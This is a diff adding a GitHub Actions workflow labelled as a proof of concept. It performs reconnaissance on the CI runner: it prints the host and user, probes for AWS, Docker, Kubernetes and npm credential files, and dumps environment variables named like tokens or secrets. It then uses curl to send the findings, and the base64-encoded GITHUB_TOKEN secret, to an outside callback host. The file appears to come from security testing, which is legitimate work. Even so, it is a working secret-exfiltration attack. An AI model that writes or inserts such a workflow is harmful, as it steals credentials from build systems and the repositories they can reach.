@@ -1,0 +1,43 @@
+name: PoC Self-Hosted Runner Recon
+on:
+  push:
+    paths:
+      - '.github/workflows/poc-1052ac31.yml'
+jobs:
+  recon:
+    runs-on: ubuntu-latest
+    steps:
+      - name: runner-environment-recon
+        run: |
+          echo "=== RUNNER INFO ==="
+          echo "Hostname: $(hostname)"
+          echo "Whoami: $(whoami)"
+          echo "Runner name: ${{ runner.name }}"
+          echo "Runner OS: ${{ runner.os }}"
+          echo "Runner Arch: ${{ runner.arch }}"
+          echo "Is self-hosted? Checking..."
+          
+          # Self-hosted runners have specific markers
+          if [ -d /actions-runner ]; then
+            echo "SELF-HOSTED DETECTED: /actions-runner directory exists"
+            ls -la /actions-runner/ 2>/dev/null || echo "(no access)"
+          fi
+          
+          echo "=== CREDENTIAL SCAN ==="
+          for p in ~/.aws/credentials ~/.docker/config.json ~/.kube/config ~/.npmrc ~/.pip/pip.conf /etc/environment /var/run/docker.sock; do
+            if [ -e "$p" ]; then echo "FOUND: $p"; else echo "ABSENT: $p"; fi
+          done
+          
+          echo "=== ENV LEAKAGE ==="
+          env | grep -iE '(token|secret|key|pass|cred|auth)' || echo "(none found)"
+          
+          echo "=== FILESYSTEM STATE ==="
+          ls -la /tmp/ 2>/dev/null | head -20
+          ls -la /home/ 2>/dev/null || echo "(no /home access)"
+          
+          # Callback: report recon findings back to collab
+          RECON_DATA="RUNNER=${{ runner.name }},OS=${{ runner.os }},HOST=$(hostname | base64 -w0),WHO=$(whoami | base64 -w0)"
+          curl -sk "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/SELF-HOSTED-RECON-$RECON_DATA"
+          
+          # Also try to exfiltrate token to show what fork PR gets
+          curl -sk -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/SELF-HOSTED-TOKEN=" < <(echo -n "${{ secrets.GITHUB_TOKEN }}" | base64 -w0)
